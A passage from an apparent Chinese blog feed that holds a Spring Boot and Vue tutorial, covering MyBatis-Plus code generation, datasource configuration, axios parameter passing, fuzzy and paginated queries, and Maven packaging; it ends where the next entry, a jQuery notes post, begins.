class="attr">src</span>=<span class="string">"https://unpkg.com/element-ui/lib/index.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>如有更多问题可以查看官方文档</p><p>文档:<a href="https://element.eleme.cn/#/zh-CN/component/installation">https://element.eleme.cn/#/zh-CN/component/installation</a></p><h4 id="依赖导入"><a href="#依赖导入" class="headerlink" title="依赖导入"></a>依赖导入</h4><p>实现Spring框架需要导入依赖</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line">    <span class="comment">&lt;!--        加载Spring驱动依赖--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>实现数据库链接和操作需要导入依赖</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--        加载数据库驱动依赖--&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.30<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-generator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.velocity<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>velocity-engine-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>使用mybatis可以在IDEA下载插件mybatis</p><h2 id="使用手册"><a href="#使用手册" class="headerlink" title="使用手册"></a>使用手册</h2><h4 id="有关CodeGenerator的使用方法"><a href="#有关CodeGenerator的使用方法" class="headerlink" title="有关CodeGenerator的使用方法"></a>有关CodeGenerator的使用方法</h4><p>这次使用的模板生成器是关于Spring结构文件和数据库实体类的自动生成</p><p>CodeGenerator代码:</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springbootvue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.DbType;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.IdType;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.AutoGenerator;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.DataSourceConfig;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.GlobalConfig;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.PackageConfig;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.StrategyConfig;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.rules.DateType;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.rules.NamingStrategy;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2018/12/13</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CodeGenerator</span> {</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> {</span><br><span class="line">        <span class="comment">// 1、创建代码生成器</span></span><br><span class="line">        <span class="type">AutoGenerator</span> <span class="variable">mpg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AutoGenerator</span>();</span><br><span class="line">        <span class="comment">// 2、全局配置</span></span><br><span class="line">        <span class="type">GlobalConfig</span> <span class="variable">gc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GlobalConfig</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">projectPath</span> <span class="operator">=</span> System.getProperty(<span class="string">"user.dir"</span>);</span><br><span class="line">        gc.setOutputDir(<span class="string">"E:\\black\\s3\\JAVA开发之Spring+Boot框架核心技术\\HotEventRanking\\springboot-vue"</span> + <span class="string">"/src/main/java"</span>);</span><br><span class="line">        gc.setAuthor(<span class="string">"frr"</span>);</span><br><span class="line">        gc.setOpen(<span class="literal">false</span>); <span class="comment">//生成后是否打开资源管理器</span></span><br><span class="line">        gc.setFileOverride(<span class="literal">false</span>); <span class="comment">//重新生成时文件是否覆盖</span></span><br><span class="line">        gc.setServiceName(<span class="string">"%sService"</span>);<span class="comment">//去掉Service接口的首字母I</span></span><br><span class="line">        gc.setIdType(IdType.ASSIGN_ID); <span class="comment">//主键策略</span></span><br><span class="line">        gc.setDateType(DateType.ONLY_DATE);<span class="comment">//定义生成的实体类中日期类型</span></span><br><span class="line">        <span class="comment">//gc.setSwagger2(true);//开启Swagger2模式</span></span><br><span class="line">        mpg.setGlobalConfig(gc);</span><br><span class="line">        <span class="comment">// 3、数据源配置</span></span><br><span class="line">        <span class="type">DataSourceConfig</span> <span class="variable">dsc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataSourceConfig</span>();</span><br><span class="line">        dsc.setUrl(<span class="string">"jdbc:mysql://localhost:3306/hospot?serverTimezone=GMT-8"</span>);</span><br><span class="line">        dsc.setDriverName(<span class="string">"com.mysql.cj.jdbc.Driver"</span>);</span><br><span class="line">        dsc.setUsername(<span class="string">"root"</span>);</span><br><span class="line">        dsc.setPassword(<span class="string">"123456"</span>);</span><br><span class="line">        dsc.setDbType(DbType.MYSQL);</span><br><span class="line">        mpg.setDataSource(dsc);</span><br><span class="line">        <span class="comment">// 4、包配置</span></span><br><span class="line">        <span class="type">PackageConfig</span> <span class="variable">pc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PackageConfig</span>();</span><br><span class="line">        pc.setParent(<span class="string">"com.example.springbootvue"</span>);</span><br><span class="line">       <span class="comment">// pc.setModuleName("admin"); //模块名</span></span><br><span class="line">        pc.setController(<span class="string">"controller"</span>);</span><br><span class="line">        pc.setEntity(<span class="string">"entity"</span>);</span><br><span class="line">        pc.setService(<span class="string">"service"</span>);</span><br><span class="line">        pc.setMapper(<span class="string">"dao"</span>);</span><br><span class="line">        mpg.setPackageInfo(pc);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5、策略配置</span></span><br><span class="line">        <span class="type">StrategyConfig</span> <span class="variable">strategy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StrategyConfig</span>();</span><br><span class="line">        strategy.setInclude(<span class="string">"commentary"</span>);<span class="comment">//生成指定的表</span></span><br><span class="line">        strategy.setNaming(NamingStrategy.underline_to_camel);<span class="comment">//数据库表映射到实体的命名策略</span></span><br><span class="line">        strategy.setTablePrefix(pc.getModuleName() + <span class="string">"_"</span>); <span class="comment">//生成实体时去掉表前缀</span></span><br><span class="line">        strategy.setColumnNaming(NamingStrategy.underline_to_camel);<span class="comment">//数据库表字段映射到实体的命名策略</span></span><br><span class="line">        strategy.setEntityLombokModel(<span class="literal">true</span>); <span class="comment">// lombok 模型 @Accessors(chain = true) setter链式操作</span></span><br><span class="line">        strategy.setRestControllerStyle(<span class="literal">true</span>); <span class="comment">//restful api风格控制器</span></span><br><span class="line">        strategy.setControllerMappingHyphenStyle(<span class="literal">true</span>); <span class="comment">//url中驼峰转连字符</span></span><br><span class="line">        strategy.setVersionFieldName(<span class="string">"version"</span>);<span class="comment">//设置乐观锁</span></span><br><span class="line">        strategy.setLogicDeleteFieldName(<span class="string">"deleted"</span>);</span><br><span class="line">        mpg.setStrategy(strategy);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6、执行</span></span><br><span class="line">        mpg.execute();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>需要配置修改的地方有</p><p>全局配置中的创建文件夹和文件代码的位置</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">gc.setOutputDir(<span class="string">"你的项目位置"</span> + <span class="string">"/src/main/java"</span>);</span><br></pre></td></tr></tbody></table></figure><p>需要复制你项目根目录的路径到此地方，这样它会自动通过+定位到Java文件夹创建相关代码模板。</p><p>生成的文件署名</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">gc.setAuthor(<span class="string">"你的名字"</span>);</span><br></pre></td></tr></tbody></table></figure><p>可以修改为你的外号或者名字，在自动生成后会以注释的形式显示出来</p><p>数据源配置之自动链接数据库配置</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">dsc.setUrl(<span class="string">"jdbc:mysql://localhost:3306/你的数据库名称?serverTimezone=GMT-8"</span>);</span><br><span class="line">dsc.setDriverName(<span class="string">"com.mysql.cj.jdbc.Driver"</span>);</span><br><span class="line">dsc.setUsername(<span class="string">"你的数据库账户名称 默认root"</span>);</span><br><span class="line">dsc.setPassword(<span class="string">"你的数据库密码"</span>);</span><br></pre></td></tr></tbody></table></figure><p>只需要更改重要的几个地方即可</p><p>链接数据库后需要生成的关键表</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">strategy.setInclude(<span class="string">"表名"</span>);<span class="comment">//生成指定的表</span></span><br></pre></td></tr></tbody></table></figure><p>最后就是你需要生成的数据库当中的表了，填写表名后会自动链接数据库然后读取表数据生成相关文件，如果需要生成多个表，那么只需要修改表名，多运行几次即可</p><h4 id="Spring中application-yml配置的使用方法"><a href="#Spring中application-yml配置的使用方法" class="headerlink" title="Spring中application.yml配置的使用方法"></a>Spring中application.yml配置的使用方法</h4><p>如果配置文件后缀不是yml可以更改为yml</p><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://127.0.0.1:3306/hospot?useUnicode=true&amp;characterEncoding=utf8&amp;useSSL=false&amp;serverTimezone=UTC&amp;zeroDateTimeBehavior=convertToNull</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="attr">configuration:</span></span><br><span class="line">    <span class="attr">map-underscore-to-camel-case:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">log-impl:</span> <span class="string">org.apache.ibatis.logging.stdout.StdOutImpl</span></span><br><span class="line">  <span class="comment">#mapper配置文件的位置</span></span><br><span class="line">  <span class="attr">mapper-locations:</span> <span class="string">classpath:mapper/xml/*.xml</span></span><br><span class="line">  <span class="comment">#别名</span></span><br><span class="line">  <span class="attr">type-aliases-package:</span> <span class="string">com.bdqn.student.entity</span></span><br></pre></td></tr></tbody></table></figure><p>需要更改的地方为，你的项目需要链接的数据库</p><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">url:</span> <span class="string">jdbc:mysql://127.0.0.1:3306/你的数据库?useUnicode=true&amp;characterEncoding=utf8&amp;useSSL=false&amp;serverTimezone=UTC&amp;zeroDateTimeBehavior=convertToNull</span></span><br></pre></td></tr></tbody></table></figure><p>数据库账号和密码的相关配置</p><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">username:</span> <span class="string">数据库账号名称</span></span><br><span class="line"><span class="attr">password:</span> <span class="string">数据库密码</span></span><br></pre></td></tr></tbody></table></figure><p>其他需要更改的地方可以修改，不然默认就可以</p><h4 id="Springboot-vue的基础传值"><a href="#Springboot-vue的基础传值" class="headerlink" title="Springboot-vue的基础传值"></a>Springboot-vue的基础传值</h4><p>众所周知，后端和前端必须相互传值才能完成一系列的数据交互以实现一些各种各样的功能。</p><p>前端大部分时候只负责渲染页面和展示数据，而后端则包揽了数据的计算和获取，把最终结果交给前端。</p><p>我们所使用的框架基本都是基于后端服务的，比如本项目中的mybatis框架，mybatis plus和maven包括CodeGenerator等，都是帮助后端快速创建项目结构和减轻重复性代码。</p><p>在后端中需要以性能为主，而前端需要保证页面的美观度和可读性。</p><p>其中最主要的就是相互传值</p><p>前端想要传值给后端需要以路径访问的形式访问，后端就可以接收到，在Spring中，前端访问后端定义好的路径后只需要在后面添加</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">?id=1</span><br></pre></td></tr></tbody></table></figure><p>就能将值传递给后端，然后后端要在方法中填写对应的参数就可以，例如：</p><p>前端</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">axios.<span class="title function_">get</span>(<span class="string">'comment/list?id='</span> + id)</span><br></pre></td></tr></tbody></table></figure><p>后端</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping("/list")</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Comment&gt; <span class="title function_">findlistByID</span><span class="params">(<span class="meta">@RequestParam</span> String id)</span>{</span><br><span class="line">        <span class="type">Comment</span> <span class="variable">comment</span> <span class="operator">=</span> commentMapper.selectById(id);</span><br><span class="line">        List&lt;Comment&gt; resultList = Collections.singletonList(comment);</span><br><span class="line">        <span class="keyword">return</span>  resultList;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>使用@RequestParam就可以获取到</p><p>tip:即使是id，在传值过程中也会变成String类型，如果需要int类型那么使用JAVA方法转换类型即可</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> Integer.parseInt(str);</span><br></pre></td></tr></tbody></table></figure><p>前端通过访问路径来获取后端的数据，在使用了Spring+mybatis+mybatis plus+CodeGenerator后，大部分操作只需要在前端控制器编写最核心代码。</p><p>以下示例:</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springbootvue.controller;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.extension.plugins.pagination.Page;</span><br><span class="line"><span class="keyword">import</span> com.example.springbootvue.dao.ChartsMapper;</span><br><span class="line"><span class="keyword">import</span> com.example.springbootvue.entity.Charts;</span><br><span class="line"><span class="keyword">import</span> com.example.springbootvue.service.ChartsService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> *  前端控制器</span></span><br><span class="line"><span class="comment"> * &lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> frr</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2023-12-11</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping("/charts")</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChartsController</span> {</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> ChartsService chartsService;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> ChartsMapper chartsMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping("list")</span></span><br><span class="line">    <span class="keyword">public</span> Page&lt;Charts&gt; <span class="title function_">findlist</span><span class="params">(<span class="meta">@RequestBody</span> Page&lt;Charts&gt; page)</span>{</span><br><span class="line">        Page&lt;Charts&gt; p = chartsService.page(page);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping("/mlist")</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Charts&gt; <span class="title function_">mlist</span><span class="params">(<span class="meta">@RequestParam</span> String input)</span>{</span><br><span class="line">        QueryWrapper&lt;Charts&gt; fuzz = <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line">        fuzz.like(<span class="string">"keywords"</span>,input);</span><br><span class="line">        List&lt;Charts&gt; charts = chartsMapper.selectList(fuzz);</span><br><span class="line">        System.out.println(charts);</span><br><span class="line">        <span class="keyword">return</span> charts;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在这个案例中，使用了两种方式传参和接收数据库数据</p><p>模糊查询和分页查询</p><p>首先来说明模糊查询</p><h4 id="模糊查询"><a href="#模糊查询" class="headerlink" title="模糊查询"></a>模糊查询</h4><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">QueryWrapper&lt;Charts&gt; fuzz = <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;(); <span class="comment">//创建模糊查询语句 然后&lt;填写自己需要查询的表的实体类&gt;</span></span><br><span class="line">fuzz.like(<span class="string">"keywords"</span>,input); <span class="comment">//参数为 查询的表的关键字 和 匹配的值 此处为动态数据传参的参数</span></span><br><span class="line">List&lt;Charts&gt; charts = chartsMapper.selectList(fuzz); <span class="comment">//将查询语句添加进查询表里，返回值为 List 就已经拿到了数据</span></span><br></pre></td></tr></tbody></table></figure><h4 id="分页查询"><a href="#分页查询" class="headerlink" title="分页查询"></a>分页查询</h4><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping("list")</span></span><br><span class="line">    <span class="keyword">public</span> Page&lt;Charts&gt; <span class="title function_">findlist</span><span class="params">(<span class="meta">@RequestBody</span> Page&lt;Charts&gt; page)</span>{</span><br><span class="line">        Page&lt;Charts&gt; p = chartsService.page(page);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>分页查询的难点在于参数是Page并且返回值也是Page</p><p>前端需要在Data里创建对象来作为分页查询的参数</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line"> data: {</span><br><span class="line">    page:{</span><br><span class="line">        current:1,</span><br><span class="line">        Size:3,</span><br><span class="line">        total:0</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ul><li><code>current</code>: 代表当前页数，即需要查询的页码。</li><li><code>Size</code>: 代表每页显示的记录数，即每页需要展示的数据条数。</li><li><code>total</code>: 代表总记录数，即数据总条数。</li></ul><p>然后就可以作为参数添加到方法里随时调用</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="title function_">findList</span>(<span class="params"></span>){</span><br><span class="line">              <span class="comment">// debugger</span></span><br><span class="line">              axios.<span class="title function_">post</span>(<span class="string">'charts/list'</span>,page=<span class="variable language_">this</span>.<span class="property">page</span>).<span class="title function_">then</span>(<span class="function"><span class="params">res</span>=&gt;</span>{</span><br><span class="line">                  <span class="comment">// console.log(res)</span></span><br><span class="line">                  <span class="variable language_">this</span>.<span class="property">tableData</span> = res.<span class="property">data</span>.<span class="property">records</span>;</span><br><span class="line">                  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">tableData</span>);</span><br><span class="line">                  <span class="variable language_">this</span>.<span class="property">page</span>.<span class="property">total</span> = res.<span class="property">data</span>.<span class="property">total</span>;</span><br><span class="line">              })</span><br><span class="line">         }</span><br></pre></td></tr></tbody></table></figure><p>只需要修改page对象的值再次发送请求就可以获取到不同页的数据了</p><p>至于后端只要按照格式去写，自动化MyBatis Plus就能帮你搞定一切，无需过于探究原理</p><p>增删改查只要会其中一个其他的皆可融会贯通，就不做过多表述了</p><h4 id="前端多参数传值"><a href="#前端多参数传值" class="headerlink" title="前端多参数传值"></a>前端多参数传值</h4><p>后端接收</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"> <span class="meta">@PostMapping("/GetAllinput")</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">GetAllInput</span><span class="params">(<span class="meta">@RequestParam</span> String AllInput,<span class="meta">@RequestParam</span> String cid)</span>{</span><br><span class="line"><span class="comment">//        获取后添加到数据表</span></span><br><span class="line">        System.out.println(<span class="string">"GetAllinput："</span> + AllInput + cid);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>前端传值</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">axios.<span class="title function_">post</span>(<span class="string">'commentary/GetAllinput?AllInput='</span> + inputValue + <span class="string">'&amp;cid='</span> + <span class="variable language_">this</span>.<span class="property">comid</span> ).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> {</span><br><span class="line">                  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'评论内容是否添加成功判断:'</span> + res);</span><br><span class="line">              });</span><br></pre></td></tr></tbody></table></figure><p>使用拼接字符串的技巧即可，当然也可以使用对象传值，这里暂不讨论，感兴趣可以网上检索</p><h2 id="Mybatis-plus使用"><a href="#Mybatis-plus使用" class="headerlink" title="Mybatis plus使用"></a>Mybatis plus使用</h2><h3 id="获取数据表一共有多少条数据"><a href="#获取数据表一共有多少条数据" class="headerlink" title="获取数据表一共有多少条数据"></a>获取数据表一共有多少条数据</h3><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.metadata.IPage;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.extension.plugins.pagination.Page;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.extension.service.additional.query.impl.QueryChainWrapper;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.extension.service.additional.query.impl.QueryOneChainWrapper;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">YourService</span> {</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> YourMapper yourMapper;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getTableRowCount</span><span class="params">()</span> {</span><br><span class="line">        QueryWrapper&lt;YourEntity&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">return</span> yourMapper.selectCount(queryWrapper);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="项目打包试运行"><a href="#项目打包试运行" class="headerlink" title="项目打包试运行"></a>项目打包试运行</h2><p>如果使用了Maven可以在右栏的<strong>生命周期</strong>里找到<strong>package</strong>快速打包</p><p>操作顺序是</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">clean</span><br><span class="line"></span><br><span class="line">compile</span><br><span class="line"></span><br><span class="line">package</span><br></pre></td></tr></tbody></table></figure><p>项目目录<strong>target</strong>下就可以看到打好的包了</p><p>如果你的环境已经<strong>部署</strong>好了<strong>maven</strong></p><p>可以使用</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">java -jar [项目名]</span><br></pre></td></tr></tbody></table></figure><p>就可以在本地跑起来了</p><p>运行Maven项目比起JavaWeb项目要方便很多,只要你在服务器上装载了JDK环境就可以</p>]]></content>
      
      
      
        <tags>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jquery学习笔记</title>
      <link href="/NANABLOG/2023/12/11/JQuery/"/>
      <url>/NANABLOG/2023/12/11/JQuery/</url>
      
